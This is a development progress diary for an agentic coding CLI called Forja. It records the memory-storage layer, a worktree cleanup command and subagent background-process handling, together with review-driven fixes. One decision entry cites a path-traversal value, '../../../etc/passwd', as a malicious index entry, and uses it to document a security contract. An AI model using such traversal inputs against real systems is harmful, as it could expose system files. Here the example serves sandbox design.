# Backlog

Forja progress diary. Entries in reverse chronological order (newest on top).

Format:

```
## [YYYY-MM-DD] <milestone>/<step> — <title>

**Done:** ...
**Decisions:** ...
**Pending:** ...
**Next:** ...
```

---

## [2026-05-01] M3 / Step 5.1 — memory storage primitives (greenfield)

The 4.2 arc closed M3's subagent surface. M3-tail items per
`AGENTIC_CLI` §13 are MCP, recap, code index, memory. Operator
prioritized memory next (skipping MCP and code index for now).
Memory is foundational for context engineering — every session
loads the per-scope index into the system prompt; without it
the agent has no cross-session continuity.

This slice (5.1 of 6) lands the storage-layer primitives —
nothing user-visible yet, but the entire vocabulary the rest of
the memory subsystem (5.2 read tools, 5.3 write surface, 5.4
trust integration, 5.5 promote/demote, 5.6 lifecycle) builds
on. Scope intentionally narrow: types, file format,
filesystem layout, audit table, and the auto-generated
`.agent/.gitignore`. No tools, no CLI, no LLM coupling.

**Done:**

| File | Change |
|---|---|
| `src/memory/types.ts` | NEW — vocabulary: `MemoryType` (user/feedback/project/reference), `MemorySource` (user_explicit/inferred/imported), `MemoryTrust` (trusted/untrusted), `MemoryScope` (user/project_shared/project_local), `MemoryFrontmatter`, `MemoryFile`, `IndexEntry`. Strict shapes; optional fields preserved as absent (not coerced) on round-trip per `exactOptionalPropertyTypes`. |
| `src/memory/frontmatter.ts` | NEW — parser/writer for the YAML frontmatter block (re-uses existing `yaml` dep already in package.json for permissions config). Strict validation: name kebab-case `[a-z0-9][a-z0-9_-]*` ≤120 chars, description single-line ≤200 chars, type/source/trust enum-checked, expires `YYYY-MM-DD` shape, triggers kebab-case ≤64 chars. Unknown fields rejected (forward compat: future spec rev with `tags`/`priority` shouldn't silently round-trip-drop). Canonical writer emits fields in spec order regardless of insertion order; serialize re-validates so callers can't smuggle invalid state. CRLF normalized on parse. |
| `src/memory/index-file.ts` | NEW — `MEMORY.md` per-scope index parser/writer. Entry shape `- [<title>](<href>) — <hook>`; em-dash canonical, ASCII ` - ` accepted as fallback for hand-edited files. `parseIndex` returns entries + `malformedLines` (1-based line numbers) for forensic surfaces; comments/headings (`#`/`>`) and blank lines silently skipped. `serializeIndex` reports `oversizedEntries` (>150 chars per spec §3.2 soft cap) and throws `IndexError` if total lines exceed the 200 hard cap (the storage primitive doesn't pick eviction policy — that lives in 5.2). `upsertIndexEntry`/`removeIndexEntry` are immutable. |
| `src/memory/paths.ts` | NEW — scope path resolver + write sandbox. `userScopeRoot` honors `XDG_CONFIG_HOME` (per spec convention; falls back to `~/.config`). `projectScopeRoots(repoRoot)` produces `<repoRoot>/.agent/memory/{shared,local}`. `memoryFilePath` validates name then re-resolves the joined path and verifies it sits strictly under the scope root (defense-in-depth even after `validateName` already rejects `..`/separators/leading dots). `scopeOfPath` does the inverse for UI/audit; checks local first so the sub-path doesn't accidentally match shared. Strict prefix check uses `root + sep` so `/cache` doesn't accept `/cache2/`. |
| `src/memory/gitignore.ts` | NEW — `ensureAgentGitignore(repoRoot)` writes default `.agent/.gitignore` per spec §2.5 on first invocation, never overwrites. Uses `wx` flag so a concurrent agent racing on first init is a no-op rather than a clobber. Defaults: `sessions.db`, `sessions.db-*`, `traces/`, `checkpoints/`, `memory/local/`, `*.log`. |
| `src/memory/index.ts` | NEW — barrel re-export. |
| `src/storage/migrations/016-memory-events.ts` | NEW — `memory_events` table per spec §5.3. Columns: id (UUID PK), scope (CHECK), action (CHECK over 9 verbs incl. expired pre-reserved for 5.6), memory_name, source (CHECK), session_id (FK ON DELETE SET NULL — audit survives session purge), cwd, created_at, details (JSON TEXT). Two indexes: partial on `(session_id) WHERE NOT NULL` for the per-session audit feed, composite `(memory_name, created_at DESC)` for the per-memory history view. |
| `src/storage/migrations/index.ts` | +import + array entry for migration 016. |
| `src/storage/repos/memory-events.ts` | NEW — `createMemoryEvent`, `listMemoryEventsBySession` (chronological, used by `/memory audit` in 5.6), `listMemoryEventsByName` (most-recent first, optional limit). Defensive `parseDetails` mirrors subagent-outputs/runs convention: malformed JSON surfaces as `null` instead of crashing the listing. |
| `src/storage/index.ts` | +re-exports for the new repo + types. |
| `tests/memory/frontmatter.test.ts` | NEW — 24 tests: canonical parse + round-trip, optional field preservation in spec order, empty body, CRLF normalization, all rejection paths (missing fences, invalid type/source/trust, multi-line description, unknown fields, expires shape, bad triggers), `validateName` accept/reject matrix, serializer guard. |
| `tests/memory/index-file.test.ts` | NEW — 14 tests: em-dash + ASCII separator, comments/headings skipped, malformed-line reporting, CRLF, canonical round-trip, header rendering, empty input, soft-max + hard-cap reporting, upsert/remove immutability. |
| `tests/memory/paths.test.ts` | NEW — 16 tests: XDG honoring (absolute only — relative ignored), default fallback, scope path construction, traversal rejection via name validation, index file paths, scope-of-path resolution including the local-vs-shared precedence and the sibling-prefix non-match. |
| `tests/memory/gitignore.test.ts` | NEW — 5 tests: first-call creation, default contents, idempotent re-call, never-overwrite operator-edited file, parent dir auto-create. |
| `tests/storage/memory-events.test.ts` | NEW — 11 tests: insert + read-back, chronological session feed, recency-ordered name feed with limit, FK SET NULL preservation across session delete, null session/cwd path, three CHECK rejections (scope/action/source), malformed-JSON details surfaces null, all 9 action verbs accepted. |

**Decisions (post-review polish bundled in):**

- **D12 (post-review C1) — `memoryFilePath` resolves BOTH root and candidate before sandbox check.** Pre-review the function only `resolve()`'d the candidate; if a caller passed a non-canonical `repoRoot` (e.g. `/repo/.agent/..`), the unnormalized root prefix wouldn't match the normalized candidate and the sandbox would falsely reject a semantically-correct path. Fix: `resolve(rootForScope(...))` before the prefix comparison. Same fix applied to `scopeOfPath` for symmetry — non-canonical `roots` (trailing slashes, `..` segments) now classify correctly. Defense-in-depth even though `repoRoot` upstream comes from `git rev-parse --show-toplevel` (canonical); the storage layer doesn't get to assume.
- **D13 (post-review C2) — Comment in `isUnderRoot` was inverted on symlink semantics.** Pre-review: "we don't re-resolve here because that would silently follow symlinks and defeat the sandbox." Wrong: `resolve()` is path-shape normalization (collapses `..`/`.` segments), it does NOT follow symlinks; that's `realpathSync`. Reading the wrong comment would lead future iterations to skip normalization for the wrong reason and re-introduce C1. Rewrote to clarify: `resolve()` normalizes shape, symlink defense is the writer's job (5.3) per the existing worktree-validator pattern.
- **D14 (post-review M1) — Misleading comment in `listMemoryEventsBySession` rewritten.** Pre-review said purged-session rows "drop out via the SET NULL FK", which conflates "row is excluded by the WHERE clause" with "row is deleted". Clarified: rows survive (FK SET NULL preserves audit history); the per-session filter excludes them, but they remain reachable via `listMemoryEventsByName`.
- **D15 (post-review M2) — Index-file parser security contract documented.** The `ENTRY_RE` regex accepts any non-paren content as `href`, so a malicious or hand-mangled MEMORY.md could embed `../../../etc/passwd`. Risk is currently zero because the storage layer doesn't compute paths from hrefs (5.2 lazy-loader uses `memoryFilePath(scope, name)` from a name-keyed map), but the contract was implicit and a future caller could regress. Added a SECURITY CONTRACT block to the file header making the rule explicit: callers MUST resolve paths via `memoryFilePath`, never by joining `entry.href`. The writer (5.4+) emits canonical `href = "${name}.md"` so agent-driven rewrites converge toward safe state.

- **D1 — Markdown body + SQLite audit, never the inverse.** Spec §5.3 is explicit: "Conteúdo das memórias **não vai pro SQLite** — fica em arquivo. SQLite só rastreia eventos." Memory content stays diffable/grep'able/git-trackable; the DB only records who/when/why an event happened. This is the line that separates the design from a vector-DB redo (`ANTI_PATTERNS` §2.2). Migration 016 enforces it: there's no `body` or `content` column anywhere.
- **D2 — Strict `name` kebab-case at the storage boundary.** Spec line 220 says "kebab-case, único no scope" but a few earlier examples informally show `name: user role` with a space. The storage layer must pick one — going strict (`^[a-z0-9][a-z0-9_-]*$`) so the `name` doubles as the filename basename without escaping, and the index can quote it without ambiguity. If an operator wants a pretty title, they put it in `description`. The frontmatter's `name` is identity, not display.
- **D3 — Unknown frontmatter fields are hard errors, not silently dropped.** Forward-compat hazard: a future spec adds `tags`. An older binary parses the file, discards the unknown field, and writes back without it — silent data loss. Failing loud forces the operator to upgrade or hand-edit the field out. The cost (hard error on legitimate operator typos) is acceptable because frontmatter mistakes should always surface visibly.
- **D4 — Optional fields stay absent on round-trip, not coerced to defaults.** `trust` omitted on input means `trust` omitted on output. The decision logic ("absent ⇒ trusted") lives in the read-side consumer (5.4), not the parser. This keeps the file format minimal — operators reading the file can see the actual frontmatter, not a serializer-injected default. Aligns with `exactOptionalPropertyTypes` strictness.
- **D5 — Sandbox is two-layered.** `validateName` blocks 99% of attacks (no separators, no `..`, no leading dot, kebab-case only). The post-resolve `isUnderRoot` check is defense-in-depth: if a future change ever loosens `validateName`, the sandbox still catches the escape. Same posture as the worktree gc cache-root scoping (§4.2d D7).
- **D6 — `expired` action verb pre-reserved.** Adding it to the CHECK clause in migration 016 costs nothing and avoids a follow-up migration when 5.6 lands the lifecycle pass. The repo helpers in 5.1 don't emit it yet — it's just reserved vocabulary. Same pattern as the two-pass M3 staging that pre-allocated `policy_snapshot` before 4.2b.ii actually used it.
- **D7 — `session_id` is FK ON DELETE SET NULL, not CASCADE.** Audit history outlives the session that produced it. After session purge ("rotate out sessions older than 90d"), the audit row stays so operators can still answer "this memory was created via inferred write at this time" — they just lose the link to the originating session. CASCADE would silently delete audit history on a routine cleanup, which defeats the audit's purpose. Same rationale as `subagent_runs` keeping rows after parent session deletion.
- **D8 — No content column in `memory_events.details`.** The temptation: stash the body alongside the event so `/memory audit` can show "what changed". Resisted: bodies live in markdown files, git tracks shared changes, and inferred writes ship a content hash in `details` (5.3) for forensic traceability without duplicating bytes. If the operator wants to see what the body was, they `git show <commit>:.agent/memory/shared/<name>.md`.
- **D9 — `MEMORY.md` is canonical state owned by the agent, NOT preserve-prose-on-write.** The parser silently drops non-entry lines (other than `#`/`>` headings and blanks); the writer regenerates clean. Operator prose belongs in individual memory bodies, where it's properly framed by frontmatter. An "ambient comment" in the index would have nowhere durable to live.
- **D10 — `userScopeRoot` honors XDG_CONFIG_HOME but ignores XDG_DATA_HOME.** Memory is curated config, not generated data. The spec path `~/.config/agent/memory/` aligns with config; routing it through `defaultDataDir()` (which uses XDG_DATA_HOME and `~/.local/share`) would put memory under the same root as `sessions.db` — convenient for one-tarball backups but semantically wrong, and the spec is explicit about the path. We also ignore relative XDG values (specs say MUST be absolute) rather than silently normalizing.
- **D11 — Em-dash is canonical separator; ASCII fallback accepted on read only.** Spec uses `—` consistently. We emit it on write; we accept ` - ` (space-hyphen-space) on read because operators editing by hand on a US keyboard rarely have `—` at fingertips, and the alternative (fail-on-parse) creates user friction in a primary edit path. Round-tripping converts `-` to `—`, which is harmless — the index is regenerated from canonical state on every write anyway.

**Pending / known limitations:**

- **No tools / CLI / context injection yet.** This slice is purely the storage layer. `memory_read`/`memory_list`/`memory_search` arrive in 5.2; the eager-index injection into the system prompt (cache breakpoint after AGENTS.md) also lives in 5.2.
- **No write surface yet.** `memory_write`, the TUI confirmation prompt, the injection scanner (heuristic + secret-pattern detection), and the headless-mode rejection all land in 5.3.
- **No trust integration yet.** `trust: untrusted` frontmatter is parsed and round-tripped; the read-side gate that excludes untrusted memories from the base context arrives in 5.4 alongside the trust-prompt encadeamento, the hash-of-source recording, and the `MemoryWrite` hook.
- **No promote/demote.** 5.5 wires `/memory promote shared|user` and `/memory demote local` with the additional secret/injection scanner.
- **No lifecycle pass.** 5.6 ships expiry sweep, default `+90d` for project-scope inferred memories, `verify-before-act` helper, `/memory expire`, `/memory diff`, `/memory audit`.
- **Filename convention is operator's responsibility.** Spec examples show type-prefixed filenames (`feedback_commit_style.md`, `user_role.md`); we keep this as a convention the operator follows when picking `name` (e.g. operator picks `feedback-commit-style`, file becomes `feedback-commit-style.md`). Forcing a type prefix would require the storage layer to read the frontmatter `type` to compute the path, creating a chicken-and-egg with the writer.

**Verification:** `bun test` 1513 pass / 10 skip / 0 fail (+85 new across the five test files including 3 review-driven regression tests for non-canonical roots); `tsc --noEmit` clean; `biome check` clean. No production code reads memory yet, so no smoke eval — adds in 5.2 when the eager-index injection lands.

**Next:** M3 / Step 5.2 — read-only surface. Resolve the three scopes per cwd, merge indexes (precedence local > shared > user), inject the merged index into the system prompt with a cache breakpoint after AGENTS.md, ship `memory_read` (lazy load with audit `read` event), `memory_list` (returns scoped summaries), `memory_search` (grep over bodies, no vector — `ANTI_PATTERNS` §2.2), and `/memory list` + `/memory show` slash commands.

---

## [2026-04-30] M3 / Step 4.2d — `agent --worktrees` operator surface (gc + list)

The 4.2b arc landed full subagent worktree lifecycle (create, isolate,
validate, cleanup, bg). Spec §11.2 + §16.9 describe the operator
surface — "Pai decide: merge, descarta, ou abre PR" + "agent worktree
gc manual" — but no command existed yet. This slice fills that gap
with `agent --worktrees list` and `agent --worktrees gc [--dry-run]
[--force]`, anchored on a small reconciler that joins the audit table,
the cache filesystem, and `git worktree list --porcelain` output.

**Done:**

| File | Change |
|---|---|
| `src/subagents/worktree-gc.ts` | NEW — `buildGcPlan` classifies every worktree into one of seven `WorktreeGcEntry` kinds (`orphan`, `stale_cleaned`, `ready_to_remove`, `preserved_dirty`, `missing`, `active`); `applyGcPlan` consumes the plan and dispatches per-kind actions. Pure function in spirit (only side effects are read calls); test seams `runGitWorktreeList` and `worktreeStatus` let the engine exercise without a real git repo. Default removal path runs `git worktree remove --force <path>` then `git branch -D <branch>`, with an `rmSync` fallback when git's admin entry was already pruned. |
| `src/storage/repos/subagent-worktrees.ts` | `listAllSubagentWorktrees` (returns every row, not just `active`/`preserved`) and `markSubagentWorktreeCleaned` (per-row terminal flip). Both are needed by the reconciler — the list-on-disk variant excludes `cleaned` rows by design, but stale cleaned rows are exactly the inconsistency gc retries. |
| `src/cli/worktrees.ts` | NEW — `runWorktreesCli` thin wrapper. Validates the verb, parses `--dry-run` / `--force` from positionals, routes to `buildGcPlan` / `applyGcPlan`. Output: NDJSON in `--json` mode (one entry per line + a final summary object); plain table otherwise. Exit 1 only on real failures (apply errors, unknown flags); skip/reconcile outcomes still exit 0. |
| `src/cli/args.ts` | `--worktrees <verb> [positionals]` parser modeled on `--checkpoints`. Stops positional collection at top-level flags (`--json`, `--help`) but keeps gc sub-flags (`--dry-run`, `--force`) so the handler can interpret them. New `args.worktrees` field. |
| `src/cli/run.ts` | New short-circuit branch dispatches to `runWorktreesCli` before the resume / run paths. Same DB-only pattern as checkpoints — no provider, no permissions, no API key required. |
| `src/cli/index.ts` | `promptOptional` now also covers `args.worktrees !== undefined` so the missing-prompt gate doesn't fire on inspection commands. |
| `tests/subagents/worktree-gc.test.ts` | NEW — 18 unit tests on `buildGcPlan` + `applyGcPlan`. Cover all seven entry kinds, --force lifting on dirty/orphan, `active` rows always skipped, removal failure leaves audit `preserved`, missing rows reconcile audit without calling runRemove. Stubs replace git calls entirely; filesystem state lives in tmpdirs. |
| `tests/cli/worktrees.test.ts` | NEW — 5 CLI-surface tests. Empty-state / NDJSON output / dry-run / unknown gc flag / unknown verb. Exercises the real engine against tmpdir state (parentCwd is non-git, so the production `runGitWorktreeList` exits non-zero and the engine treats it as "git silent" — still classifies via DB+disk). |
| `tests/cli/args.test.ts` | +5 tests on `--worktrees` parsing: verb capture, no-positionals for `list`, missing/unknown verb rejection, top-level flag boundary preserves `--json`. |

**Decisions (post-review polish bundled in):**

- **D7 (post-review C1) — Scope gc candidates to cache-root + DB-known paths.** `git worktree list --porcelain` ALWAYS includes the parent repo's main worktree plus any unrelated linked worktrees the operator hand-created. Original union added all of them to `allPaths`, classified the parent as `orphan` (no DB row), and `--force` would have routed it to `defaultRunRemove` — `git worktree remove --force` refuses to remove the main worktree, but the rmSync fallback would still execute, recursively deleting the operator's entire repository. Filter rule: a candidate enters the plan only if (a) the audit DB knows the path (operator may have customized `rootDir`) OR (b) the path is strictly under the cache root. `isUnderRoot(path, root)` rejects `path === root` and uses `root + sep` so `/cache` doesn't accept `/cache2/...`. Defense-in-depth: `defaultRunRemove` re-asserts `isUnderRoot` before any `rmSync`, so a corrupted DB row can't slip a non-cache path past the upstream filter. Threading required signature change `RunRemoveFn` to take `cacheRoot` as a 4th positional arg; existing test stubs are TS-compatible (callbacks may take fewer params).
- **D8 (post-review M1) — Path canonicalization across DB/git/cache.** `realpathSync` per path before unioning into the `allPaths` Set. Fallback to literal on ENOENT keeps the `missing` detection working for rows whose worktree was deleted. macOS-flavored `/var` ↔ `/private/var` and operator-side cache-root symlinks no longer split a single worktree into multiple plan entries.
- **D9 (post-review M2) — Honest audit on `markSubagentWorktreeCleaned` failure.** Per-row capture of the helper's boolean return + try/catch error. For the `missing` kind (where audit-flip IS the only work), failure flips action to `failed` instead of mis-claiming `reconciled-audit`. For `removed` paths (disk work succeeded, audit lagging), keeps action='removed' but appends `; AUDIT DRIFT: <error>` to detail so operators see the partial state without pretending the disk-side work failed.
- **D10 (post-review M3) — Don't silence git-known orphans with null branch.** Earlier draft skipped emission when `!onDisk && gitBranch === null` under the dbRow=undefined branch. Hid genuine inconsistencies (git admin entry without a `branch` line, working tree externally removed). Removed the skip; emits orphan with `branch: null` so the operator gets the signal.
- **D11 (post-review M4) — Deleted unused `formatTime` helper.** YAGNI; re-add when an actual filter needs it.

- **D1 — Flag style (`--worktrees`), not subcommand-style (`agent worktree gc`).** Spec §1605 wrote `agent worktree gc`, but Forja's existing surface uses flags exclusively (`--checkpoints`, `--undo`, `--list-sessions`, `--resume`). Consistency wins: same parser shape, same dispatch path in run.ts, same test patterns. The user types `agent --worktrees gc --dry-run` instead of `agent worktree gc --dry-run`; trade-off is two extra characters for code that's smaller and more uniform.
- **D2 — Plan/apply split.** `buildGcPlan` returns a `WorktreeGcPlan` value; `applyGcPlan` consumes it. Splits policy from side effects. `--dry-run` literally just renders the plan and skips apply. Tests can assert classification logic (engine pure with stubs) AND apply outcomes (engine + recorded mock removals) independently.
- **D3 — Seven entry kinds, not three.** Initial sketch had `orphan`, `ready_to_remove`, `preserved_dirty`. Adding `stale_cleaned`, `missing`, and `active` covered the realistic-but-uncommon states without making the apply branch a dictionary of edge cases. `active` in particular is load-bearing: 4.2b inserts active rows BEFORE child spawn, and gc must NEVER touch a worktree whose subagent is still running.
- **D4 — `--force` only lifts `preserved_dirty` + `orphan`.** Other kinds either auto-act (`ready_to_remove`, `stale_cleaned`, `missing`) or never act (`active`). The flag's surface area stays small and operator-predictable.
- **D5 — Removal failure leaves audit untouched.** A `git worktree remove` that fails leaves the row at its existing status (`preserved` or `cleaned`). Operator can retry via the next `gc` pass. The alternative (flipping audit on failure) would lie about the world state, which is the bug we already fixed in the bg reaper. Same principle.
- **D6 — Branch deletion is best-effort and only on successful removal.** A failed remove leaves the working tree linked to the branch and `git branch -D` would refuse. Branch survival is fine — operator can `git branch -D` themselves once the worktree is gone.
- **D7 — `agent --worktrees merge <id>` deferred.** The spec mentions merge, but operators can use raw `git merge agent/<slug>-<id>` today without ergonomics loss. A merge wrapper would need to handle conflict surfaces (interactive prompts in --json mode? abort flow?) that don't have clear answers yet. Defer until the dor de uso aparece.

**Pending / known limitations:**

- **Cross-repo scoping is per-invocation.** gc invoked from repo A only operates on rows whose parent session's cwd is at or under A's repo root (resolved via `git rev-parse --show-toplevel`, fallback to literal cwd). Worktrees from repo B remain untouched even if both repos share the global DB + cache root. Operator must run gc in each repo to clean that repo's leftovers. A multi-repo "sweep all" would need explicit operator opt-in (`--all-repos`?) — defer until demand exists.
- **Orphan-parent worktrees invisible to gc.** `subagent_worktrees.session_id` references the CHILD session; the JOIN to find the parent's cwd uses `sessions.parent_session_id`. If the parent session was deleted (manual purge, FK SET NULL cascade), the row becomes invisible to `--worktrees gc`. Operator must clean manually (rm dir + DB UPDATE). Rare in practice; documenting because the path-scoping query intentionally excludes parent-NULL rows to keep cross-repo isolation safe.
- **Nested repos confuse scoping.** Repo B physically inside repo A (`/a/.../b`) — gc from A includes B's rows because `b/cwd LIKE /a/%`. The LIKE doesn't distinguish "subdirectory" from "nested git repo". gc from B gets the precise scope; gc from A surfaces B's rows. Per-row `git rev-parse` would fix it but adds a fork per row. Defer.
- **Concurrent gc invocations.** Two `gc` runs at the same time would race on the same worktree (both query the plan, both try to remove). The second would see `git worktree remove` fail with "not a worktree". Not catastrophic — the loser's audit row stays untouched, the winner's flips. Could add advisory file locking later; defer.
- **No retention TTL.** Currently gc removes any clean preserved worktree, regardless of age. An operator might want "preserve last 24h, remove older" — that's a future flag (`--older-than 24h`).

**Verification:** `bun test` 1428 pass / 10 skip / 0 fail (+43 new across all review iterations including LIKE-wildcard regression); `tsc --noEmit` clean; `biome check` clean. Real-surface smoke `evals/smoke-worktree-gc.sh` passes — covers `git rev-parse`, `git worktree list --porcelain` parsing, `git worktree remove --force`, real filesystem mutation, and the operator CLI dispatch end-to-end without a provider call.

**Next:** With 4.2d landed, the 4.2 arc is COMPLETE (a, b, b.i, b.ii.a/b, b.iii, b.iv, d). The 4.2c (per-step checkpoints inside subagent worktrees) remains explicitly out of scope — not in spec, no consumer demand. M3 next steps move out of subagents into the M3-tail items per `docs/spec/AGENTIC_CLI.md` §13: MCP, recap, code index, memory subsystems.

---

## [2026-04-30] M3 / Step 4.2b.iv — per-subagent bg log dir, lifts requiresBgManager gate

The 4.2a/b arc landed subagents with one capability hole: any
tool declaring `metadata.requiresBgManager=true` was refused at
both bootstrap (`validate.ts`) and runtime (`runtime.ts`). The
refusal was correct given the runtime — the child harness ran
without a bg manager, so `bash_background`/`bash_output`/
`bash_kill` and the process-aware paths in `wait_for`/`monitor`
would have surfaced confusing late errors. But it also meant
subagents couldn't run dev servers, watchers, build daemons, or
anything long-lived: a worktree refactor agent that wanted to
boot the test suite as a bg process and tail its output had to
abort and let the user do it. This slice closes that gap: each
subagent run gets its own bg log directory, threaded across the
subprocess boundary, so the child harness can wire a real bg
manager without colliding with the parent's bg state.

**Done:**

| File | Change |
|---|---|
| `src/subagents/runtime.ts` | `SpawnChildProcessOptions` gains a `bgLogDir?: string` field; `defaultSpawnChildProcess` forwards it via `--subagent-bg-log-dir <path>`. `runSubagent` computes `<input.cwd>/.agent/bg/<childSessionId>/` (anchored to the parent's cwd, not the worktree, so the operator's `bg list` from the project root keeps showing only parent processes) and passes it on every spawn. End-of-run cleanup adds a best-effort `rmSync` of the directory after `cleanupWorktree` — the bg manager creates the dir lazily on first spawn, so subagents that never invoked a bg tool leave nothing to remove. The previous `requiresBgManager` refusal in `assertWhitelistValidForSubagent` is removed; the comment is reworded to reference the lift. |
| `src/subagents/validate.ts` | Bootstrap-time `requiresBgManager` refusal removed; header comment shrinks from "three checks" to "two checks" plus a note about why the third was lifted. |
| `src/cli/subagent-child.ts` | `SubagentChildOptions` gains `bgLogDir?: string`; the `HarnessConfig` build conditionally spreads it in. When omitted (older parents, tests routing around the spawn) the harness runs without a bg manager and `requiresBgManager` tools refuse at invocation time — same shape as a top-level run without `bgLogDir`. |
| `src/cli/args.ts` | `--subagent-bg-log-dir <path>` recognized in the parser; `ParsedArgs.subagentBgLogDir?: string` added. Empty / missing value rejected with a parse error mirroring the other subagent-internal flags. |
| `src/cli/index.ts` | The parsed `subagentBgLogDir` flows into `runSubagentChild` through the same conditional-spread pattern as the other subagent flags. |
| `tests/subagents/validate.test.ts` | Three pre-existing tests that asserted refusal flipped to assert acceptance under the new contract: `bash_background` under `isolation: 'worktree'` accepted; `bash_output` (writes:false + requiresBgManager:true) accepted under both isolation modes. The "accept under worktree, reject under none via writes gate" path stayed (writes:true refusal still fires under `isolation: 'none'` — bg lift didn't relax that), with the message regex updated to match the writes-gate error. The pure `requiresBgManager error names the offending source path` test was deleted (the message no longer exists). |
| `tests/subagents/runtime.test.ts` | The `requiresBgManager tool refused regardless of isolation` test inverted to `4.2b.iv: requiresBgManager tool no longer rejected by registry gate` — asserts that the runtime gets PAST the registry validation (the worktree creation still fails because the test cwd '/p' isn't a git repo, but the failure reason is `worktree_create_failed`, not the registry refusal). +2 new tests: `parent threads per-session bgLogDir into spawn opts` (path shape `<parentCwd>/.agent/bg/<sessionId>/`), and `cleanupWorktree end-of-run removes the bgLogDir if it exists` (spawn fake mkdirs the dir and writes a fake log file; runtime's end-of-run rmSync must remove it). |

**Decisions:**

- **bgLogDir anchored to parent's cwd, namespaced under `subagents/`.** Path: `<parentCwd>/.agent/bg/subagents/<childSessionId>/`. Anchoring to the parent (not the worktree) keeps the operator's `bg list` view consistent (project root shows parent's processes); the `subagents/` infix segregates the namespace so parent flat-file layout (`<bgId>.stdout.log`) and subagent dir layout don't mix in the same directory listing. The alternative (`<worktree>/.agent/bg/`) would auto-clean with worktree removal but risks polluting `git status` if the project doesn't have `.agent/.gitignore`.
- **Lazy directory creation.** The bg manager already creates the directory on first spawn (existing `ensureDir(logDir)` in `bg/manager.ts`). The runtime doesn't pre-create it; subagents that never invoke a bg tool leave no directory to clean up. End-of-run `rmSync` uses `force: true` to swallow ENOENT in the no-spawn case.
- **Cleanup is best-effort.** The directory holds stdout/stderr log files we no longer need after the run finishes; failing to remove them is operationally harmless (cache pollution, not correctness loss). ENOENT is silenced (common case); other errors (permission denied, disk full) get logged to stderr so the operator notices the cache leak. `agent worktree gc` (4.2d) will sweep stragglers together with stale worktrees.
- **Reap orphan bg processes before rmSync (D10 from review).** Pre-review the cleanup pattern relied on the child harness's `bgManager.cleanup()` running in its own finally to kill live processes. That assumption holds for clean exits but FAILS for the SIGKILL paths 4.2b.ii.b made common (heartbeat stale, wall-clock kill, abort escalation) — finally is uncatchable past SIGKILL, processes get reparented to PID 1 and the rmSync would unlink log files they're still writing to. `reapChildBgProcesses` now runs before rmSync: queries `listBgProcessesBySession(status='running')`, SIGTERMs each PID, waits 500ms, SIGKILLs survivors, marks DB rows as 'killed'. Idempotent — no-op when the child's finally already cleaned up.
- **Reap before worktree cleanup (D16 from review #10).** The previous order ran `cleanupWorktree` before `reapChildBgProcesses`, so live bg processes the child spawned with `bash_background` (whose default cwd is the worktree) could race with `git status --porcelain` (partial-write artifacts triggering preserve when post-reap state would be clean) AND block `git worktree remove --force` on filesystems that refuse to drop a directory while another process has it as cwd (Windows / older macOS / NFS mounts; cleanupWorktree's own comment already calls this out). The reorder guarantees a stable post-reap snapshot before the worktree pass: bg processes dead, cwd-pins released, tracked diff frozen.
- **Tri-state PID identity: `match`/`gone`/`mismatch` (D15 from review #9).** The boolean `isStillSameProcess` collapsed two distinct outcomes — process truly gone (ENOENT on /proc, audit row should flip terminal) and identity mismatch (recycled PID, exec-replace, EACCES — process MAY be alive, audit must stay 'running'). The bulk `markRunningAsKilled(sessionId)` then unconditionally flipped EVERY row in the session to 'killed', meaning a mismatch (e.g. a recorded `exec sleep 60` that bash-replaces itself into sleep) would lie in audit AND let downstream rmSync unlink log files of a still-living process. New design: `checkPidIdentity` returns `'match' | 'gone' | 'mismatch'`. Reaper partitions rows into matched (signal + mark killed), gone (mark killed only), mismatch (skip both). Per-row `markBgProcessAsKilled(db, id)` repo helper replaces the bulk call so we can flip rows individually and leave mismatched rows 'running' for the operator. The conditional rmSync from D14 then naturally preserves the bgLogDir when mismatched rows remain.
- **Conditional rmSync: skip when 'running' rows remain (D14 from review #8).** The previous slice unconditionally removed `bgLogDir` after the reaper returned. On non-Linux platforms (where the reaper bails early without killing or marking) this re-introduced the unlink-while-running behavior the reaper exists to prevent — live processes kept writing to phantom file descriptors AND the operator lost the artifacts needed for manual investigation. The runtime now re-queries `listBgProcessesBySession(status='running')` after the reaper; rmSync runs only when zero rows remain. On Linux the reaper's `markRunningAsKilled` flips every row, so the count is zero and cleanup proceeds (current behavior preserved). On non-Linux the rows stay 'running' (reaper bailed before the marker), the count is non-zero, rmSync is skipped, and a stderr warning tells the operator the dir was preserved. Defensive: a re-query DB error treats as worst-case (skip rmSync).
- **Platform-gated reaper (D12 from review #5).** The identity check uses `/proc/<pid>/cmdline`, which only exists on Linux. On macOS / Windows / BSDs the read fails for every PID, isStillSameProcess returns false everywhere, both passes skip every signal — but the previous code STILL called `markRunningAsKilled`, leaving real orphan processes alive while audit state claimed termination. The reaper now checks `process.platform === 'linux'` up front; non-Linux paths emit a stderr warning and return WITHOUT marking anything killed, so the audit stays truthful and the operator knows to use OS-native tools (`ps`, Activity Monitor, Task Manager). Forja's CI runs on Linux only, so this is mostly a future-proofing for the day someone runs the binary on macOS — the production path is unchanged.
- **Direct-spawn match compares full argv tokens (D13 from review #7).** The fallback for non-bash-wrapped processes originally compared only argv[0]'s basename. A recycled PID landing on a different invocation of the same binary (recorded `sleep 60` exits, kernel hands the PID to a fresh `sleep 30`) would falsely match and earn SIGKILL. The check now: argv length must equal the tokenized recorded length; argv[0]'s basename must match recorded[0]'s basename; argv[i] === recorded[i] for every subsequent index. Limitation: tokenization is naive whitespace split, so quoted args don't round-trip — direct-spawn callers that need quoting fidelity should route through bash-wrapper. Production already uses bash-wrapper exclusively; this path's primary user is the test suite, where commands are whitespace-clean by construction.
- **Re-verify PID before EVERY signal (D11 from reviews #2/#3/#4).** The two-pass reaper (SIGTERM → grace → SIGKILL) originally trusted the snapshot from `listBgProcessesBySession`. Three review iterations refined the identity check: (a) review #2 caught the SIGKILL pass — 500ms grace lets the kernel recycle a PID; (b) review #3 caught the SIGTERM pass for the same reason but with a wider window (the snapshot's `os_pid` was recorded at spawn time, potentially seconds/minutes earlier); (c) review #4 caught a regression in the matcher itself — the bg manager always spawns via `bash -c <command>`, so the live argv[0] is always `bash`, never the user's tool name; the original basename check would have refused EVERY production bg process. `isStillSameProcess` now branches: if argv[0]=`bash`/`sh` AND argv[1]='-c', compare argv[2] verbatim to the recorded command (exact match — both come from the same input string the bg manager passed through); else fall back to argv[0]'s basename vs the recorded command's first-token basename (handles direct spawns from tests / programmatic callers). Linux-only by design; Forja's environment targets Linux (CLAUDE.md). DB row still flips to 'killed' via `markRunningAsKilled` because that's audit (we tried to terminate the run); operator cross-checking can find live processes that the gate refused to touch.
